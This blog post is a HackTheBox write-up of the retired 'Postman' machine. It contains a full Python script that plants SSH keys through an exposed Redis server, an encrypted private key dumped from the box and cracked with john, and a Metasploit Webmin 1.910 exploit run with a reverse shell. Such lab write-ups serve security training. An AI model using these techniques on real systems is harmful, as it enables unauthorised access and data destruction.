<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>HTB: Postman | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2020/03/htb-postman.html" title="Read more" class="entry-title-link">
                HTB: Postman</a>
        </h1>

        <div class="entry-date">
            <time datetime="2020-03-15T09:30:00+01:00">15 Mar 2020</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
          <a href="../../tag/redis.html" title="Read more with the label redis" class="meta-link">redis</a> 
          <a href="../../tag/webmin.html" title="Read more with the label webmin" class="meta-link">webmin</a> 
          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 8 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2020.03/postman_card.png" alt="Postman Card" width="262"></p>
<p>This is a writeup about a retired HacktheBox machine:
<a href="https://www.hackthebox.eu/home/machines/profile/215">Postman</a> publish on
Novemer the second 2019 by
<a href="https://www.hackthebox.eu/home/users/profile/114053">TheCyberGeek</a>.
This box is rated as easy box. It implies a redis server, a <code>id_rsa.bak</code>, john
the ripper and webmin 1.910.</p>


<h1 id="recon">Recon</h1>
<h2 id="nmap">nmap</h2>
<p>Let us start as always by a <code>nmap</code> scan. The box is quit busy so first of all we
run a simple aggressive TCP scan:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Tue Nov 19 16:52:02 2019 as: nmap -p- -sS -oA nmap_all_port -T4 10.10.10.160</span>
<span class="code-line">Nmap scan report for 10.10.10.160</span>
<span class="code-line">Host is up (0.090s latency).</span>
<span class="code-line">Not shown: 65530 closed ports</span>
<span class="code-line">PORT      STATE SERVICE</span>
<span class="code-line">22/tcp    open  ssh</span>
<span class="code-line">80/tcp    open  http</span>
<span class="code-line">4444/tcp  open  krb524</span>
<span class="code-line">6379/tcp  open  redis</span>
<span class="code-line">10000/tcp open  snet-sensor-mgmt</span>
<span class="code-line"></code></pre></div>

<p>We run a version scan on this open ports:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Tue Nov 19 18:32:32 2019 as: nmap -p22,80,4444,6379,10000 -sSV -oA nmap_version 10.10.10.160</span>
<span class="code-line">Nmap scan report for 10.10.10.160</span>
<span class="code-line">Host is up (0.087s latency).</span>
<span class="code-line"></span>
<span class="code-line">PORT      STATE  SERVICE VERSION</span>
<span class="code-line">22/tcp    open   ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span>
<span class="code-line">80/tcp    open   http    Apache httpd 2.4.29 ((Ubuntu))</span>
<span class="code-line">4444/tcp  closed krb524</span>
<span class="code-line">6379/tcp  open   redis   Redis key-value store 4.0.9</span>
<span class="code-line">10000/tcp open   http    MiniServ 1.910 (Webmin httpd)</span>
<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
<span class="code-line"></code></pre></div>

<p>The open ports are:</p>
<ul>
<li>22: SSH</li>
<li>80: a web server</li>
<li>6379: a redis server</li>
<li>10 000: another web server</li>
</ul>
<p>We do not have any information to connect to the SSH server.</p>
<p>The website on port 80 does not give us anything.</p>
<p>The website on port 10 000 is a webmin login interface. There is a few exploit
available for it. But none of it works.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>searchsploit webmin</span>
<span class="code-line">-------------------------------------------------------------------------</span>
<span class="code-line">Exploit Title</span>
<span class="code-line"></span>
<span class="code-line">-------------------------------------------------------------------------</span>
<span class="code-line">DansGuardian Webmin Module 0.x - &#39;edit.cgi&#39; Directory Traversal</span>
<span class="code-line">Webmin - Brute Force / Command Execution</span>
<span class="code-line">Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing</span>
<span class="code-line">Webmin 0.x - &#39;RPC&#39; Privilege Escalation</span>
<span class="code-line">Webmin 0.x - Code Input Validation</span>
<span class="code-line">Webmin 1.5 - Brute Force / Command Execution</span>
<span class="code-line">Webmin 1.5 - Web Brute Force (CGI)</span>
<span class="code-line">Webmin 1.580 - &#39;/file/show.cgi&#39; Remote Command Execution (Metasploit)</span>
<span class="code-line">Webmin 1.850 - Multiple Vulnerabilities</span>
<span class="code-line">Webmin 1.900 - Remote Command Execution (Metasploit)</span>
<span class="code-line">Webmin 1.910 - &#39;Package Updates&#39; Remote Command Execution (Metasploit)</span>
<span class="code-line">Webmin 1.920 - Remote Code Execution</span>
<span class="code-line">Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)</span>
<span class="code-line">Webmin 1.x - HTML Email Command Execution</span>
<span class="code-line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure (PHP)</span>
<span class="code-line">Webmin &lt; 1.290 / Usermin &lt; 1.220 - Arbitrary File Disclosure (Perl)</span>
<span class="code-line">phpMyWebmin 1.0 - &#39;target&#39; Remote File Inclusion</span>
<span class="code-line">phpMyWebmin 1.0 - &#39;window.php&#39; Remote File Inclusion</span>
<span class="code-line">webmin 0.91 - Directory Traversal</span>
<span class="code-line">-------------------------------------------------------------------------</span>
<span class="code-line">Shellcodes: No Result</span>
<span class="code-line"></code></pre></div>

<h2 id="redis">Redis</h2>
<p>The last service is the redis server. We use redis-cli in order to connect to
it and start enumerating using the autocompletion.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# redis-cli -h 10.10.10.160</span>
<span class="code-line">10.10.10.160:6379&gt; CONFIG GET dbfilename</span>
<span class="code-line">1) &quot;dbfilename&quot;</span>
<span class="code-line">2) &quot;authorized_keys&quot;</span>
<span class="code-line">10.10.10.160:6379&gt; CONFIG GET dir</span>
<span class="code-line">1) &quot;dir&quot;</span>
<span class="code-line">2) &quot;/var/lib/redis/.ssh&quot;</span>
<span class="code-line"></code></pre></div>

<p>A quick Google search for "redis ssh exploit" return this
<a href="https://github.com/Avinash-acid/Redis-Server-Exploit">github repository</a>.
We modify the script to include our <code>.ssh</code> folder:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="ch">#!/usr/bin/python</span></span>
<span class="code-line"><span class="c1">#Author : Avinash Kumar Thapa aka -Acid</span></span>
<span class="code-line"><span class="c1">#Twitter : https://twitter.com/m_avinash143</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">os</span></span>
<span class="code-line"><span class="kn">import</span> <span class="nn">os.path</span></span>
<span class="code-line"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span></span>
<span class="code-line"><span class="kn">from</span> <span class="nn">termcolor</span> <span class="kn">import</span> <span class="n">colored</span></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">script</span><span class="p">,</span> <span class="n">ip_address</span><span class="p">,</span> <span class="n">username</span> <span class="o">=</span> <span class="n">argv</span></span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line"><span class="n">PATH</span><span class="o">=</span><span class="s1">&#39;/usr/bin/redis-cli&#39;</span></span>
<span class="code-line"><span class="n">PATH1</span><span class="o">=</span><span class="s1">&#39;/usr/local/bin/redis-cli&#39;</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">def</span> <span class="nf">ssh_connection</span><span class="p">():</span></span>
<span class="code-line">  <span class="n">shell</span> <span class="o">=</span> <span class="s2">&quot;ssh -i &quot;</span> <span class="o">+</span> <span class="s1">&#39;$HOME/.ssh/id_rsa &#39;</span> <span class="o">+</span> <span class="n">username</span><span class="o">+</span><span class="s2">&quot;@&quot;</span><span class="o">+</span><span class="n">ip_address</span></span>
<span class="code-line">  <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span></span>
<span class="code-line"></span>
<span class="code-line"><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">PATH</span><span class="p">)</span> <span class="ow">or</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">PATH1</span><span class="p">):</span></span>
<span class="code-line">  <span class="k">try</span><span class="p">:</span></span>
<span class="code-line">        <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">*******************************************************************&#39;</span><span class="p">,</span> <span class="s2">&quot;green&quot;</span><span class="p">)</span></span>
<span class="code-line">        <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">* [+] [Exploit] Exploiting misconfigured REDIS SERVER*&#39;</span> <span class="p">,</span><span class="s2">&quot;green&quot;</span><span class="p">)</span></span>
<span class="code-line">        <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">* [+] AVINASH KUMAR THAPA aka &quot;-Acid&quot;                                &#39;</span><span class="p">,</span> <span class="s2">&quot;green&quot;</span><span class="p">)</span></span>
<span class="code-line">    <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\t</span><span class="s1">*******************************************************************&#39;</span><span class="p">,</span> <span class="s2">&quot;green&quot;</span><span class="p">)</span></span>
<span class="code-line">    <span class="nb">print</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span></span>
<span class="code-line">    <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2"> SSH Keys Need to be Generated&quot;</span><span class="p">,</span> <span class="s1">&#39;blue&#39;</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ssh-keygen -t rsa -C </span><span class="se">\&quot;</span><span class="s1">acid_creative</span><span class="se">\&quot;</span><span class="s1">&#39;</span><span class="p">)</span></span>
<span class="code-line">    <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2"> Keys Generated Successfully&quot;</span><span class="p">,</span> <span class="s2">&quot;blue&quot;</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;(echo &#39;</span><span class="se">\r\n\&#39;</span><span class="s2">; cat $HOME/.ssh/id_rsa.pub; echo  </span><span class="se">\&#39;\r\n\&#39;</span><span class="s2">) &gt; $HOME/.ssh/public_key.txt&quot;</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&quot;redis-cli -h &quot;</span> <span class="o">+</span> <span class="n">ip_address</span> <span class="o">+</span> <span class="s1">&#39; flushall&#39;</span></span>
<span class="code-line">    <span class="n">cmd1</span> <span class="o">=</span> <span class="s2">&quot;redis-cli -h &quot;</span> <span class="o">+</span> <span class="n">ip_address</span></span>
<span class="code-line">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">cmd2</span> <span class="o">=</span> <span class="s2">&quot;cat $HOME/.ssh/public_key.txt | redis-cli -h &quot;</span> <span class="o">+</span>  <span class="n">ip_address</span> <span class="o">+</span> <span class="s1">&#39; -x set cracklist&#39;</span></span>
<span class="code-line">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd2</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">cmd3</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s1">&#39; config set dbfilename &quot;backup.db&quot; &#39;</span></span>
<span class="code-line">                <span class="n">cmd4</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s1">&#39; config set dir &quot;/var/lib/redis/.ssh/&quot; &#39;</span></span>
<span class="code-line">    <span class="n">cmd5</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s1">&#39; config set dbfilename &quot;authorized_keys&quot; &#39;</span></span>
<span class="code-line">    <span class="n">cmd6</span> <span class="o">=</span> <span class="n">cmd1</span> <span class="o">+</span> <span class="s1">&#39; save&#39;</span></span>
<span class="code-line">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd3</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd4</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd5</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd6</span><span class="p">)</span></span>
<span class="code-line">    <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2">You&#39;ll get shell in sometime..Thanks for your patience&quot;</span><span class="p">,</span> <span class="s2">&quot;green&quot;</span><span class="p">)</span></span>
<span class="code-line">    <span class="n">ssh_connection</span><span class="p">()</span></span>
<span class="code-line"></span>
<span class="code-line">  <span class="k">except</span><span class="p">:</span></span>
<span class="code-line">    <span class="nb">print</span> <span class="s2">&quot;Something went wrong&quot;</span></span>
<span class="code-line"><span class="k">else</span><span class="p">:</span></span>
<span class="code-line">  <span class="nb">print</span> <span class="n">colored</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\t</span><span class="s2">Redis-cli:::::This utility is not present on your system. You need to install it to proceed further.&quot;</span><span class="p">,</span> <span class="s2">&quot;red&quot;</span><span class="p">)</span></span>
<span class="code-line"></code></pre></div>

<p>Running this script will give us a shell as redis.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>python redis.py 10.10.10.160 redis</span>
<span class="code-line">  *******************************************************************</span>
<span class="code-line">  * [+] [Exploit] Exploiting misconfigured REDIS SERVER*</span>
<span class="code-line">  * [+] AVINASH KUMAR THAPA aka &quot;-Acid&quot;</span>
<span class="code-line">  *******************************************************************</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">  SSH Keys Need to be Generated</span>
<span class="code-line">Generating public/private rsa key pair.</span>
<span class="code-line">Enter file in which to save the key (/root/.ssh/id_rsa):</span>
<span class="code-line">/root/.ssh/id_rsa already exists.</span>
<span class="code-line">Overwrite (y/n)? y</span>
<span class="code-line">Enter passphrase (empty for no passphrase):</span>
<span class="code-line">Enter same passphrase again:</span>
<span class="code-line">Your identification has been saved in /root/.ssh/id_rsa.</span>
<span class="code-line">Your public key has been saved in /root/.ssh/id_rsa.pub.</span>
<span class="code-line">The key fingerprint is:</span>
<span class="code-line">SHA256:AXkEW81gyz1YrQfxEQw3t82W/NoAp6q8IdpYTPV8sN0 acid_creative</span>
<span class="code-line">The key&#39;s randomart image is:</span>
<span class="code-line">+---[RSA 3072]----+</span>
<span class="code-line">|      o+=++==..  |</span>
<span class="code-line">|      .*.=+oo+.+.|</span>
<span class="code-line">|      ..* +oo oo+|</span>
<span class="code-line">|       . +.=.= ..|</span>
<span class="code-line">|      . S +.+ E .|</span>
<span class="code-line">|     o     o   + |</span>
<span class="code-line">|      + . .   . .|</span>
<span class="code-line">|     = o o       |</span>
<span class="code-line">|    o . +.       |</span>
<span class="code-line">+----[SHA256]-----+</span>
<span class="code-line">  Keys Generated Successfully</span>
<span class="code-line">OK</span>
<span class="code-line">OK</span>
<span class="code-line">OK</span>
<span class="code-line">OK</span>
<span class="code-line">OK</span>
<span class="code-line">OK</span>
<span class="code-line">  You&#39;ll get shell in sometime..Thanks for your patience</span>
<span class="code-line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)</span>
<span class="code-line"></span>
<span class="code-line">* Documentation:  https://help.ubuntu.com</span>
<span class="code-line">* Management:     https://landscape.canonical.com</span>
<span class="code-line">* Support:        https://ubuntu.com/advantage</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">* Canonical Livepatch is available for installation.</span>
<span class="code-line">  - Reduce system reboots and improve kernel security. Activate at:</span>
<span class="code-line">    https://ubuntu.com/livepatch</span>
<span class="code-line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span>
<span class="code-line"></span>
<span class="code-line">Last login: Wed Nov 20 15:31:13 2019 from 10.10.14.110</span>
<span class="code-line">redis@Postman:~$</span>
<span class="code-line"></code></pre></div>

<h1 id="getting-user">Getting user</h1>
<h2 id="enumeration">Enumeration</h2>
<p>We start enumerating. We quickly see that the user is <code>Matt</code>. Our <code>redis</code> user
has a non-empty bash history we can look at.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>redis@Postman:~$ cat .bash_history</span>
<span class="code-line">exit</span>
<span class="code-line">su Matt</span>
<span class="code-line">pwd</span>
<span class="code-line">nano scan.py</span>
<span class="code-line">python scan.py</span>
<span class="code-line">nano scan.py</span>
<span class="code-line">clear</span>
<span class="code-line">nano scan.py</span>
<span class="code-line">clear</span>
<span class="code-line">python scan.py</span>
<span class="code-line">exit</span>
<span class="code-line">exit</span>
<span class="code-line">cat /etc/ssh/sshd_config</span>
<span class="code-line">su Matt</span>
<span class="code-line">clear</span>
<span class="code-line">cd /var/lib/redis</span>
<span class="code-line">su Matt</span>
<span class="code-line">exit</span>
<span class="code-line">cat id_rsa.bak</span>
<span class="code-line">ls -la</span>
<span class="code-line">exit</span>
<span class="code-line">cat id_rsa.bak</span>
<span class="code-line">exit</span>
<span class="code-line">ls -la</span>
<span class="code-line">crontab -l</span>
<span class="code-line">systemctl enable redis-server</span>
<span class="code-line">redis-server</span>
<span class="code-line">ifconfig</span>
<span class="code-line">netstat -a</span>
<span class="code-line">netstat -a</span>
<span class="code-line">netstat -a</span>
<span class="code-line">netstat -a</span>
<span class="code-line">netstat -a &gt; txt</span>
<span class="code-line">exit</span>
<span class="code-line">crontab -l</span>
<span class="code-line">cd ~/</span>
<span class="code-line">ls</span>
<span class="code-line">nano 6379</span>
<span class="code-line">exit</span>
<span class="code-line"></code></pre></div>

<p>When searching for the files mentioned in the history we found that the
<code>id_rsa.bak</code> key exist in <code>/opt/</code> and is an encrypted RSA private key.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>redis@Postman:~$ find / -name &#39;id_rsa.bak&#39; 2&gt; /dev/null^C</span>
<span class="code-line">/opt/id_rsa.bak</span>
<span class="code-line">redis@Postman:~$ cat /opt/id_rsa.bak</span>
<span class="code-line">-----BEGIN RSA PRIVATE KEY-----</span>
<span class="code-line">Proc-Type: 4,ENCRYPTED</span>
<span class="code-line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span>
<span class="code-line"></span>
<span class="code-line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span>
<span class="code-line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span>
<span class="code-line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span>
<span class="code-line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span>
<span class="code-line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span>
<span class="code-line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span>
<span class="code-line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span>
<span class="code-line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span>
<span class="code-line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span>
<span class="code-line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span>
<span class="code-line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span>
<span class="code-line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span>
<span class="code-line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span>
<span class="code-line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span>
<span class="code-line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span>
<span class="code-line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span>
<span class="code-line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span>
<span class="code-line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span>
<span class="code-line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span>
<span class="code-line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span>
<span class="code-line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span>
<span class="code-line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span>
<span class="code-line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span>
<span class="code-line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span>
<span class="code-line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span>
<span class="code-line">-----END RSA PRIVATE KEY-----</span>
<span class="code-line"></code></pre></div>

<p>We copy the key on our computer and use <code>ssh2john</code> to extract the hash from the
key and run a john on it: the password is <code>computer2008</code>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>python2 /usr/bin/ssh2john redis_rsa &gt; redis_rsa.hash</span>
<span class="code-line">john redis_rsa.hash -w=rockyou.txt</span>
<span class="code-line">computer2008</span>
<span class="code-line"></code></pre></div>

<p>The key does not allow us to connect using the SSH key (the ssh connection
closed immediately). I also tried this creds for a locally elevation with <code>su</code>
and it works… I do not know why the user will have the same password as it
sshkey passphrase but it works and we get the user flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>redis@Postman:~$ su Matt</span>
<span class="code-line">Password:</span>
<span class="code-line">Matt@Postman:/var/lib/redis$ cd</span>
<span class="code-line">Matt@Postman:~$ ls</span>
<span class="code-line">user.txt</span>
<span class="code-line">Matt@Postman:~$ cat user.txt</span>
<span class="code-line">517ad0&lt;redacted&gt;</span>
<span class="code-line"></code></pre></div>

<h1 id="getting-root">Getting root</h1>
<p>The previous creds also work on the webmin authentication form allowing us to
login an see the webmin version: 1.910.</p>
<p><img alt="webmin dashboard" src="/media/2020.03/postman_1.png"></p>
<p>The exploit for searchsploit should works.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>Webmin 1.910 - &#39;Package Updates&#39; Remote Command Execution (Metasploit)  | exploits/linux/remote/46984.rb</span>
<span class="code-line"></code></pre></div>

<p>We import the script in metasploit:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>mkdir ~/.msf/modules/exploits/linux/remote</span>
<span class="code-line">cp /usr/share/exploitdb/exploits/linux/remote/46984.rb</span>
<span class="code-line">updated</span>
<span class="code-line">msfconsole</span>
<span class="code-line"></code></pre></div>

<p>We give to metasploit all the needed information (user, password, IPs) and do
not forget to put the <code>SSL</code> parameter to <code>true</code>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 exploit(linux/remote/46984) &gt; show options</span>
<span class="code-line"></span>
<span class="code-line">Module options (exploit/linux/remote/46984):</span>
<span class="code-line"></span>
<span class="code-line">  Name       Current Setting  Required  Description</span>
<span class="code-line">  ----       ---------------  --------  -----------</span>
<span class="code-line">  PASSWORD   computer2008     yes       Webmin Password</span>
<span class="code-line">  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span>
<span class="code-line">  RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span>
<span class="code-line">  RPORT      10000            yes       The target port (TCP)</span>
<span class="code-line">  SSL        true             no        Negotiate SSL/TLS for outgoing connections</span>
<span class="code-line">  TARGETURI  /                yes       Base path for Webmin application</span>
<span class="code-line">  USERNAME   Matt             yes       Webmin Username</span>
<span class="code-line">  VHOST                       no        HTTP server virtual host</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">Payload options (cmd/unix/reverse_perl):</span>
<span class="code-line"></span>
<span class="code-line">  Name   Current Setting  Required  Description</span>
<span class="code-line">  ----   ---------------  --------  -----------</span>
<span class="code-line">  LHOST  10.10.14.13      yes       The listen address (an interface may be specified)</span>
<span class="code-line">  LPORT  4444             yes       The listen port</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">Exploit target:</span>
<span class="code-line"></span>
<span class="code-line">  Id  Name</span>
<span class="code-line">  --  ----</span>
<span class="code-line">  0   Webmin &lt;= 1.910</span>
<span class="code-line"></code></pre></div>

<p>Then we run the script. We are directly root on the box and get the flag.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 exploit(linux/remote/46984) &gt; run</span>
<span class="code-line">[*] Started reverse TCP handler on 10.10.14.13:4444</span>
<span class="code-line">[+] Session cookie: a2ff4450e3a344159ab1fd464db52855</span>
<span class="code-line">[*] Attempting to execute the payload...</span>
<span class="code-line">[*] Command shell session 1 opened (10.10.14.13:4444 -&gt; 10.10.10.160:32916) at 2019-11-20 14:39:02 +0100</span>
<span class="code-line"></span>
<span class="code-line">id</span>
<span class="code-line">uid=0(root) gid=0(root) groups=0(root)</span>
<span class="code-line">cat root.txt</span>
<span class="code-line">cat /root/root.txt</span>
<span class="code-line">a2577&lt;redacted&gt;</span>
<span class="code-line"></code></pre></div>

<h1 id="wrapping-up">Wrapping up</h1>
<p>This box was not the most interesting one as everything is pretty straight
forward. Moreover the name
suggested me that there will be some SMTP (or IMAP) involved. I am a bit
disappointed.</p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2020/02/vault.html"> Vault </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2020/03/htb-forest.html"> HTB: Forest </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
